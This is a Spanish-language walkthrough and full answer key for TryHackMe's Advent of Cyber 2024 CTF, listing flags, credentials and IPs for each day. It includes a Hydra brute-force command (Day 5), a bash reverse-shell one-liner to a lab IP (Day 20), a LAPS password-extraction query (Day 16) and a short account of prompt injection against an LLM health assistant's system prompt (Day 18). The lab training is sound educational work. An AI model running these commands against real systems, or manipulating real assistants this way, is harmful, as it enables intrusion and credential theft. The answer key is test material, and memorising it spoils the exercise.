# Advent of Cyber 2024

| **Dificultad** | Easy |
| **Tipo** | CTF derivado del contenido |
| **Slug** | `adventofcyber2024` |
| **Link** | [TryHackMe](https://tryhackme.com/room/adventofcyber2024) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | Wireshark / Splunk / Burp Suite / AWS CLI / Powershell / S3 / Wi-Fi (Evil Twin) / Hydra / Netcat / Sigma / SQL |
| **Impacto** | Advent of Cyber 2024: análisis SOC y de logs Windows, webshells, reglas Sigma, AWS CloudTrail, phishing, evil twin WiFi, LLM prompt injection, C2 y privilegios. |

---

**Contexto:** Glitch y el Mayor Malware amenazan Wareville en 2024. La sala cubre detección y respuesta: análisis SOC de alertas iniciales (Tyler Ramsbey y papash3ll.thm), logs de eventos Windows, detección de webshells, reglas Sigma contra ransomware (BlackByte), fuerza bruta, AWS CloudTrail, GRC, phishing, evil twin WiFi (MalwareM_AP), race conditions, análisis forense de una web comprometida, LLM con prompt injection y análisis de un C2 (mayorc2.thm).

## Solucionario

### Task 1: Introducción

**Explicación:** Presentación de la edición 2024: un nuevo villano, el Mayor Malware (junto a Glitch), amenaza Wareville. La sala mezcla detección SOC, nube, WiFi, LLM y análisis de C2. Solo lectura.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción del evento. | `No answer needed` |

### Task 2: Preparación del laboratorio

**Explicación:** Configuración del entorno: activar la máquina del día (confirmando acceso con `yes`), conectar por VPN/AttackBox, comprobar acceso web y red. Tarea de preparación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Configura tu entorno de trabajo. | `No answer needed` |
| 2 | ¿Tienes acceso a la máquina del día? | `yes` |
| 3 | Activa la máquina y comprueba la conectividad. | `No answer needed` |
| 4 | Accede por VPN/AttackBox. | `No answer needed` |
| 5 | Repasa el material de cada tarea. | `No answer needed` |
| 6 | Verifica la red del laboratorio. | `No answer needed` |
| 7 | Comprueba el acceso web. | `No answer needed` |
| 8 | Ejecuta los primeros pasos de configuración. | `No answer needed` |

### Task 3: Historia de fondo

**Explicación:** Backstory: la red de la ciudad de Wareville es atacada por Glitch y el Mayor Malware, que sabotean el gran evento navideño "Happy Elf" con ransomware y accesos no autorizados. Solo lectura.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la historia del evento. | `No answer needed` |

### Task 4: Contexto del reto

**Explicación:** Repaso del contexto operativo de la sala: objetivos diarios y cómo cada día añade una técnica nueva (SOC, detección, nube, hardware, LLM). Solo lectura.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa el contexto y los objetivos del reto. | `No answer needed` |

### Task 5: Cómo jugar

**Explicación:** Explicación del formato: cada día una tarea con máquinas y preguntas de respuesta exacta, seguida en la interfaz del evento. Solo lectura.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Repasa el formato de las tareas diarias. | `No answer needed` |

### Task 6: Primeros pasos

**Explicación:** Primeros pasos guiados dentro de la interfaz del laboratorio (simplejan o el panel del evento) para familiarizarse. Sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Realiza los primeros pasos del reto. | `No answer needed` |

### Task 7: Día 1 - Análisis SOC (reconocimiento)

**Explicación:** Primera alerta SOC: se identifica al actor como `Tyler Ramsbey`, cuya información pública de perfil se recupera de `http://papash3ll.thm/data`; pertenece al grupo/organización llamado `Mayor Malware`. El perfil aporta `1` elemento clave a la alerta. Lección: correlacionar el perfil del adversario (OSINT) con la alerta del SIEM.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Quién es el actor identificado en el caso? | `Tyler Ramsbey` |
| 2 | ¿Cuál es la URL de la que se obtienen los datos del atacante? | `http://papash3ll.thm/data` |
| 3 | ¿Cómo se denomina el grupo/afiliación del actor (Mayor Malware)? | `Mayor Malware` |
| 4 | ¿Cuántos elementos clave se extraen de la alerta? | `1` |
| 5 | Correlaciona el perfil del actor con la alerta del SOC. | `No answer needed` |
| 6 | Cierra el caso de la primera alerta. | `No answer needed` |

### Task 8: Día 2 - Análisis de logs de Windows

**Explicación:** Revisión de un Event Log de Windows: la cuenta que ejecutó el evento es `service_admin`, con PID `6791`, conexión desde `10.0.255.1`, timestamp `Dec 1, 2024 08:54:39.000` y el comando de PowerShell ejecutado `Install-WindowsUpdate -AcceptAll -AutoReboot` (evento tipo PowerShell/Sysmon). Lección: los Event Logs 4xxx/41xxx y el audit de PowerShell delatan actividad administrativa o maliciosa.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué cuenta de usuario ejecutó el evento analizado? | `service_admin` |
| 2 | ¿Cuál es el PID del proceso responsable del evento? | `6791` |
| 3 | ¿Qué dirección IP origina la conexión registrada? | `10.0.255.1` |
| 4 | ¿Qué timestamp corresponde al evento en el registro? | `Dec 1, 2024 08:54:39.000` |
| 5 | ¿Qué comando de PowerShell se ejecutó en el evento? | `Install-WindowsUpdate -AcceptAll -AutoReboot` |
| 6 | Documenta el hallazgo del registro de eventos. | `No answer needed` |

### Task 9: Día 3 - Detección de webshell

**Explicación:** Búsqueda de una webshell en el servidor web: el archivo malicioso está en `/media/images/rooms/shell.php` y la IP `10.11.83.34` lo explota. La flag del caso es `THM{Gl1tch_Was_H3r3}`. Lección: revisar directorios de subida de imágenes en busca de archivos .php y logs de acceso.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la ruta del webshell subido al servidor web? | `/media/images/rooms/shell.php` |
| 2 | ¿Qué dirección IP intenta explotar el webshell? | `10.11.83.34` |
| 3 | ¿Cuál es la flag del caso? | `THM{Gl1tch_Was_H3r3}` |
| 4 | Busca las trazas de la subida del webshell. | `No answer needed` |

### Task 10: Día 4 - Detección de ransomware (Sigma)

**Explicación:** Laboratorio de detección: la primera flag es `THM{GlitchTestingForSpearphishing}`; el ataque de spearphishing usa la técnica MITRE `T1059` (Command and Scripting Interpreter), concretamente la sub-técnica `T1059.003` (Windows Command Shell). La regla/campaña simulada se llama `Simulate BlackByte Ransomware Print Bombing` y deja la nota `Wareville_Ransomware.txt`. La flag codificada en la regla Sigma es `THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}` (la parte interna es base64 de "Glitch is not the enemy"). Lección: traducir el comportamiento del ransomware a reglas Sigma.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la primera flag del laboratorio? | `THM{GlitchTestingForSpearphishing}` |
| 2 | ¿Qué técnica de MITRE ATT&CK (id principal) describe el ataque? | `T1059` |
| 3 | ¿Qué sub-técnica de MITRE se usa para la búsqueda? | `T1059.003` |
| 4 | ¿Cómo se llama la regla/campaña simulada contra el ransomware? | `Simulate BlackByte Ransomware Print Bombing` |
| 5 | ¿Qué archivo se deja como nota de rescate/prueba del ataque? | `Wareville_Ransomware.txt` |
| 6 | ¿Cuál es la flag codificada de la regla Sigma? | `THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}` |
| 7 | Valida la regla Sigma contra los eventos del laboratorio. | `No answer needed` |

### Task 11: Día 5 - Fuerza bruta

**Explicación:** Fuerza bruta de accesos (login web/SSH): las flags del reto son `THM{Brut3f0rc1n6_mY_w4y}` y `THM{m4y0r_m4lw4r3_b4ckd00rs}`. Con Hydra y credenciales obtenidas se accede al servicio. Lección: contraseñas débiles y ausencia de rate-limiting permiten agotar el espacio de credenciales.

```bash
hydra -l usuario -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/login:user=^USER^&pass=^PASS^:F"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la primera flag del reto de fuerza bruta? | `THM{Brut3f0rc1n6_mY_w4y}` |
| 2 | ¿Cuál es la segunda flag del reto? | `THM{m4y0r_m4lw4r3_b4ckd00rs}` |
| 3 | Fuerza el acceso con las credenciales obtenidas. | `No answer needed` |
| 4 | Termina la cadena de fuerza bruta. | `No answer needed` |

### Task 12: Día 6 - Enumeración web

**Explicación:** Enumeración del servidor web: la primera flag es `THM{GlitchWasHere}` y la segunda (pista oculta en el contenido/código) es `THM{HiddenClue}`. Recorriendo rutas y leyendo comentarios del HTML/JS se agotan las pistas. Lección: enumerar directorios y revisar el código fuente para encontrar contenido oculto.

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
curl http://MACHINE_IP/pagina | grep -iE "flag|clue"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la primera flag del servidor web? | `THM{GlitchWasHere}` |
| 2 | ¿Cuál es la segunda flag (pista oculta)? | `THM{HiddenClue}` |
| 3 | Enumera el sitio hasta agotar las pistas. | `No answer needed` |

### Task 13: Día 7 - AWS CloudTrail (identidad y acceso)

**Explicación:** Revisión de logs CloudTrail: el suceso analiza la acción de API `PutObject` sobre el bucket desde la IP `53.94.201.69`, con el dominio de autenticación `signin.amazonaws.com`, timestamp `2024-11-28T15:21:54Z`. La identidad que ejecuta es `glitch` con la política adjunta `AdministratorAccess`. En la revisión de eventos aparecen dos IPs (`53.94.201.69` y `31.210.15.79`) y cuatro IDs de cookie de sesión (`2394 6912 7723 1294`). Lección: CloudTrail permite auditar identidades, policies y orígenes en AWS.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué acción de API se ejecutó en el evento analizado? | `PutObject` |
| 2 | ¿Cuál es la IP de origen de la acción sobre el bucket? | `53.94.201.69` |
| 3 | ¿Qué dominio de autenticación gestiona la identidad? | `signin.amazonaws.com` |
| 4 | ¿Qué timestamp se registra en el evento CloudTrail? | `2024-11-28T15:21:54Z` |
| 5 | ¿Qué nombre de usuario/identidad ejecuta la acción? | `glitch` |
| 6 | ¿Qué política/rol tiene asociada esa identidad? | `AdministratorAccess` |
| 7 | ¿Qué IP de origen se repite en la revisión de eventos? | `53.94.201.69` |
| 8 | ¿Qué otra IP de origen aparece en los eventos? | `31.210.15.79` |
| 9 | ¿Qué IDs de sesión (cookies) se observan en el análisis? | `2394 6912 7723 1294` |
| 10 | Revisa los derechos de la identidad y el resto de eventos. | `No answer needed` |

### Task 14: Día 8 - Recuperación del acceso

**Explicación:** Con la identidad `glitch` comprometida/pwned se restablece el acceso a la consola AWS; la flag de recuperación es `AOC{GOT _MY_ACCESS_B@CK007}`. Lección: recuperar el control tras comprometer una identidad con AdministratorAccess.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag de recuperación del acceso al sistema? | `AOC{GOT _MY_ACCESS_B@CK007}` |
| 2 | Restablece el acceso con la identidad comprometida. | `No answer needed` |

### Task 15: Día 9 - Gobernanza, Riesgo y Cumplimiento (GRC)

**Explicación:** Introducción a GRC: la sigla significa `Governance, Risk, and Compliance`. La flag del reto es `THM{R15K_M4N4G3D}`. Se aplica el control de riesgo indicado (crear un registro de activos y accionar el plan). Lección: dimensionar el riesgo con políticas de gobernanza y compliance.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué significado tiene la sigla GRC? | `Governance, Risk, and Compliance` |
| 2 | ¿Cuál es la flag de la tarea de GRC? | `THM{R15K_M4N4G3D}` |
| 3 | Aplica el control de riesgo indicado en el reto. | `No answer needed` |

### Task 16: Día 10 - Phishing

**Explicación:** Análisis de un correo phishing: se revisa el remitente/dominio y el enlace completo para confirmar el fraude; la flag es `THM{PHISHING_CHRISTMAS}`. Lección: ver cabeceras y URLs antes de hacer clic; los enlaces acortados o de dominios sospechosos delatan el phishing.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag del análisis de phishing? | `THM{PHISHING_CHRISTMAS}` |
| 2 | Analiza el correo y el enlace completo. | `No answer needed` |

### Task 17: Día 11 - WiFi (Evil Twin / hotspot)

**Explicación:** Análisis de una captura WiFi (PCAP) con Wireshark/aircrack: el punto de acceso malicioso tiene MAC `02:00:00:00:02:00` y SSID `MalwareM_AP`; los dos clientes conectados tienen MACs `02:00:00:00:00:00` y `02:00:00:00:01:00`. En el portal falso (evil twin) se capturan las credenciales `fluffy/champ24`. Lección: los evil twins copian el SSID legítimo y roban credenciales del portal de autenticación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la dirección MAC del punto de acceso malicioso? | `02:00:00:00:02:00` |
| 2 | ¿Cómo se llama el SSID del hotspot malicioso (nombre + AP)? | `MalwareM_AP` |
| 3 | ¿Cuál es la MAC del primer cliente conectado al AP? | `02:00:00:00:00:00` |
| 4 | ¿Cuál es la MAC del segundo cliente conectado al AP? | `02:00:00:00:01:00` |
| 5 | ¿Qué credenciales (usuario/contraseña) se capturan en el portal falso? | `fluffy/champ24` |
| 6 | Analiza la captura de la red inalámbrica. | `No answer needed` |

### Task 18: Día 12 - Race condition

**Explicación:** Condición de carrera (TOCTOU): enviar dos peticiones simultáneas (p. ej., con `xargs -P2` o Burp Turbo Intruder) aprovecha la falta de sincronización del servicio; la flag es `THM{WON_THE_RACE_007}`. Lección: las verificaciones seguidas de uso (check-then-use) sin atomicidad son explotables con concurrencia.

```bash
(echo "A"; sleep 1; echo "B") | xargs -P2 -I{ } curl ... 
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag del reto de falta de sincronización (TOCTOU)? | `THM{WON_THE_RACE_007}` |
| 2 | Explota la condición de carrera del servicio. | `No answer needed` |
| 3 | Verifica la doble petición simultánea. | `No answer needed` |

### Task 19: Día 13 - Vehículos / servicios

**Explicación:** Explotación de los servicios del "trineo" de la ciudad (el reto usa una API/servicio de vehículos). Las flags son `THM{dude_where_is_my_car}` y `THM{my_name_is_malware._mayor_malware}`. Lección: los servicios no documentados de la infraestructura pueden exponer control de dispositivos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la primera flag del reto de servicios? | `THM{dude_where_is_my_car}` |
| 2 | ¿Cuál es la segunda flag del reto? | `THM{my_name_is_malware._mayor_malware}` |
| 3 | Explota el servicio del vehículo para cerrar el caso. | `No answer needed` |

### Task 20: Día 14 - Linux (host comprometido)

**Explicación:** Reconocimiento del host Linux: el hostname es `THM` y el usuario con sesión activa es `c4rrotn0s3`. Las flags del sistema son `THM{AoC-3lf0nth3Sh3lf}` y `THM{AoC-h0wt0ru1nG1ftD4y}`; la contraseña del usuario SOC encontrada en el sistema es `H0llyJ0llySOCMAS!`. Lección: revisar procesos, cronjobs y archivos de configuración en el host comprometido para escalar.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hostname de la máquina Linux? | `THM` |
| 2 | ¿Cuál es el nombre del usuario con sesión activa? | `c4rrotn0s3` |
| 3 | ¿Cuál es la primera flag del sistema? | `THM{AoC-3lf0nth3Sh3lf}` |
| 4 | ¿Cuál es la contraseña del usuario SOC? | `H0llyJ0llySOCMAS!` |
| 5 | ¿Cuál es la segunda flag del sistema? | `THM{AoC-h0wt0ru1nG1ftD4y}` |
| 6 | Escala y consolida el acceso en el host. | `No answer needed` |

### Task 21: Día 15 - Eventos de Windows y Active Directory

**Explicación:** Análisis de eventos del DC: el logon analizado ocurre el `07/11/2024` con Event ID `4624` (logon exitoso); se detecta el comando de PowerShell `Get-ADUser -Filter * -Properties MemberOf | Select-Object Name` para enumerar AD. También aparece la contraseña en claro `SuperSecretP@ssw0rd!` y el GPO malicioso de persistencia `Malicious GPO - Glitch_Malware Persistence`. Lección: Windows Event Logs + PowerShell auditing revelan enumeración y persistencia en el dominio.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Empieza el análisis de los eventos del controlador de dominio. | `No answer needed` |
| 2 | ¿Qué fecha aparece en el evento de inicio de sesión analizado? | `07/11/2024` |
| 3 | ¿Cuál es el ID del evento de logon registrado? | `4624` |
| 4 | ¿Qué comando de PowerShell se usó para listar los usuarios y grupos del dominio? | `Get-ADUser -Filter * -Properties MemberOf | Select-Object Name` |
| 5 | ¿Qué contraseña en texto plano se detecta en los eventos? | `SuperSecretP@ssw0rd!` |
| 6 | ¿Cómo se llama el GPO malicioso de persistencia? | `Malicious GPO - Glitch_Malware Persistence` |
| 7 | Revisa los GPO y los objetos del dominio. | `No answer needed` |

### Task 22: Día 16 - Recuperación de secretos

**Explicación:** Recuperación de secretos (LAPS/objetos protegidos de AD): el secreto de recuperación es `R3c0v3r_s3cr3ts!`, el GUID del objeto protegido `7d96660a-02e1-4112-9515-1762d0cb66b7`, el usuario `aoc2024` con contraseña `aoc2024` y la contraseña del usuario recuperado es `WhereIsMyMind1999`. Lección: los atributos protegidos/ms-Mcs-AdmPwd exponen contraseñas si los permisos están mal configurados.

```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la clave/secreto de recuperación encontrado? | `R3c0v3r_s3cr3ts!` |
| 2 | ¿Cuál es el GUID/ID del objeto protegido? | `7d96660a-02e1-4112-9515-1762d0cb66b7` |
| 3 | ¿Cuál es el valor de la contraseña/usuario 'aoc2024'? | `aoc2024` |
| 4 | ¿Cuál es la contraseña del usuario recuperado? | `WhereIsMyMind1999` |
| 5 | Restaura el acceso con los secretos extraídos. | `No answer needed` |

### Task 23: Día 17 - Base de datos

**Explicación:** Consulta a una base de datos (SQL): la primera consulta devuelve `642` elementos, la tabla consultada guarda el token/secreto `rij5uu4gt204q0d3eb7jj86okt` y el usuario que ejecuta la consulta es `mmalware`. Lección: credenciales de BD compartidas y tablas con secretos en claro comprometen el motor completo.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos elementos devuelve la consulta a la base de datos? | `642` |
| 2 | ¿Qué token/secreto se encuentra en la tabla consultada? | `rij5uu4gt204q0d3eb7jj86okt` |
| 3 | ¿Qué usuario ejecuta la consulta en la base de datos? | `mmalware` |
| 4 | Consulta el resto de tablas del motor. | `No answer needed` |
| 5 | Documenta el acceso a la base de datos. | `No answer needed` |

### Task 24: Día 18 - LLM (prompt injection)

**Explicación:** Prompt injection sobre un servicio LLM de salud (Hospital): se manipula la entrada del sistema (el `system prompt`) para que revele información. La consulta al servicio de salud `status` devuelve la respuesta buscada y la flag `THM{WareW1se_Br3ach3d}`. Lección: los LLM conectados a herramientas (function calling) pueden ser manipulados para ejecutar acciones no autorizadas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué parte del sistema se manipula como entrada en el ataque? | `system prompt` |
| 2 | ¿Qué consulta al servicio de salud permite obtener la respuesta? | `Use the health service with the query: status` |
| 3 | Prueba a engañar al asistente con instrucciones externas. | `No answer needed` |
| 4 | ¿Cuál es la flag de la aplicación de salud comprometida? | `THM{WareW1se_Br3ach3d}` |
| 5 | Analiza los límites del asistente con inyecciones directas. | `No answer needed` |

### Task 25: Día 19 - Crackeo de contraseñas

**Explicación:** Crackeo de hashes con la wordlist del laboratorio (rockyou): las flags son `THM{one_tough_password}`, `THM{credit_card_undeclined}` y `THM{dont_smash_your_keyboard}`. Lección: hashes MD5/NTLM sin salt y contraseñas predecibles se recuperan con john/hashcat.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la primera flag del reto de crackeo? | `THM{one_tough_password}` |
| 2 | ¿Cuál es la segunda flag del reto? | `THM{credit_card_undeclined}` |
| 3 | ¿Cuál es la tercera flag del reto? | `THM{dont_smash_your_keyboard}` |
| 4 | Crackea los hashes con la wordlist del laboratorio. | `No answer needed` |
| 5 | Termina de crackear el resto de hashes. | `No answer needed` |

### Task 26: Día 20 - Acceso remoto (reverse shell)

**Explicación:** Reverse shell desde la máquina comprometida: al ganar acceso la shell muestra `I am in Mayor!`, enviada a la IP `10.10.123.224`. Usando `whoami` se confirma la identidad y se lee `credentials.txt`, cuyo secreto es `THM_Secret_101`. Lección: montar un listener con netcat y ejecutar un payload de reverse shell para interactuar.

```bash
nc -lvnp 4444
# en la víctima: bash -i >& /dev/tcp/10.10.123.224/4444 0>&1
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué mensaje muestra la shell al ganar acceso? | `I am in Mayor!` |
| 2 | ¿A qué dirección IP se envía la shell? | `10.10.123.224` |
| 3 | ¿Qué comando se utiliza para confirmar la identidad del usuario? | `whoami` |
| 4 | ¿Qué archivo contiene las credenciales del usuario? | `credentials.txt` |
| 5 | ¿Cuál es el contenido del secreto extraído? | `THM_Secret_101` |
| 6 | Asegura la shell con el host de escucha. | `No answer needed` |

### Task 27: Día 21 - Análisis de C2 (mayorc2)

**Explicación:** Análisis del binario/tráfico del C2: al recibir la instrucción, el malware ejecuta `DownloadAndExecuteFile` (descarga y ejecuta), usa `explorer.exe` como proceso contenedor (process hollowing/injection), contacta el C2 `mayorc2.thm`, empaqueta los datos robados en `CollectedFiles.zip` y pivota a un segundo dominio `anonymousc2.thm`. Lección: identificar comando C2, contenedor de proceso y rutas de exfiltración.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué acción ejecuta el malware cuando recibe la instrucción? | `DownloadAndExecuteFile` |
| 2 | ¿Qué proceso legítimo usa el malware como contenedor? | `explorer.exe` |
| 3 | ¿Qué dominio del C2 se detecta en el análisis? | `mayorc2.thm` |
| 4 | ¿Qué archivo empaqueta el malware con los archivos robados? | `CollectedFiles.zip` |
| 5 | ¿Qué otro dominio de la segunda fase se identifica? | `anonymousc2.thm` |
| 6 | Documenta el flujo de la comunicación C2. | `No answer needed` |

### Task 28: Día 22 - Análisis del servidor web comprometido

**Explicación:** Reconstrucción de la intrusión en el servidor web a partir de logs de acceso: el primer webshell es `shelly.php`, le sigue el archivo de configuración `db.php`; el atacante se conecta con `nc` (netcat) desde `10.10.130.253`. El acceso sospechoso abarca de `29/Oct/2024:10:06:33 +0000` a `29/Oct/2024:12:34:28 +0000`. En el log de Docker se exfiltran credenciales del registro: `{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"mr.nice","password":"Mr.N4ughty","auth":"bXIubmljZTpNci5ONHVnaHR5"}}}`. Lección: correlacionar timestamps y archivos para reconstruir el kill chain.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué primer archivo PHP se usa como shell? | `shelly.php` |
| 2 | ¿Qué segundo archivo PHP (configuración) se detecta? | `db.php` |
| 3 | ¿Qué herramienta se usa para conectarse al servidor? | `nc` |
| 4 | ¿Qué dirección IP del atacante se conecta al servidor? | `10.10.130.253` |
| 5 | ¿Qué timestamp registra el primer acceso sospechoso? | `29/Oct/2024:10:06:33 +0000` |
| 6 | ¿Qué timestamp registra el último acceso sospechoso? | `29/Oct/2024:12:34:28 +0000` |
| 7 | ¿Qué configuración de credenciales (JSON) se exfiltra del registro Docker? | `{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"mr.nice","password":"Mr.N4ughty","auth":"bXIubmljZTpNci5ONHVnaHR5"}}}` |
| 8 | Reconstruye la línea temporal de la intrusión. | `No answer needed` |

### Task 29: Día 23 - Red inalámbrica (contraseña)

**Explicación:** El dispositivo WiFi comprometido usa una contraseña por defecto en el portal: `fluffycat12`; conectando con ella se obtiene la flag `THM{do_not_GET_CAUGHT}`. Lección: las contraseñas por defecto de routers/dispositivos permiten entrar sin conocer la red.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña por defecto del dispositivo comprometido? | `fluffycat12` |
| 2 | ¿Cuál es la flag del reto WiFi? | `THM{do_not_GET_CAUGHT}` |
| 3 | Conecta con el dispositivo usando la contraseña encontrada. | `No answer needed` |

### Task 30: Día 24 - Cierre del evento

**Explicación:** Episodio final de la historia: tras desarticular al Mayor Malware, la flag de cierre es `THM{Ligh75on-day54ved}`. Repaso de conclusiones de la temporada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag final de la historia del evento? | `THM{Ligh75on-day54ved}` |
| 2 | Repasa las conclusiones del episodio final. | `No answer needed` |

### Task 31: Encuesta

**Explicación:** Encuesta de valoración del evento para cerrar la edición 2024.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Responde a la encuesta de cierre del evento. | `No answer needed` |

### Task 32: Flag de despedida

**Explicación:** Tras completar el evento, la flag de despedida anuncia la próxima edición: `THM{we_will_be_back_in_2025}`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Gracias por participar. Introduce la flag final del año. | `THM{we_will_be_back_in_2025}` |

---

**Metodología:** El día 1 parte de una alerta SOC ligada al actor Tyler Ramsbey. Los días de detección revisan logs de eventos Windows, webshells abiertos y reglas Sigma contra ransomware. La nube se investiga con CloudTrail (PutObject y AdministratorAccess). Se practican fuerza bruta, enumeración web, análisis de un evil twin WiFi (MalwareM_AP con credenciales fluffy/champ24), race conditions, Linux y eventos AD (4624, GPO malicioso). La novedad del año es la prompt injection sobre un servicio LLM de salud. Finaliza con crackeo, reverse shell, análisis del C2 mayorc2.thm y la reconstrucción del servidor web comprometido (shelly.php/db.php).

**Learning chain:** alertas SOC → logs Windows → webshells → Sigma → fuerza bruta → enumeración → CloudTrail → GRC → phishing → evil twin → race condition → Linux → AD/GPO → secretos → SQL → LLM injection → crackeo → reverse shell → C2 → análisis web.

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1566 (Phishing), T1486 (Data Encrypted for Impact), T1071 (Application Layer Protocol), T1105 (Ingress Tool Transfer), T1552 (Unsecured Credentials), T1547 (Boot or Logon Autostart Execution)

**Fuente:** [TryHackMe - Advent of Cyber 2024](https://tryhackme.com/room/adventofcyber2024)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
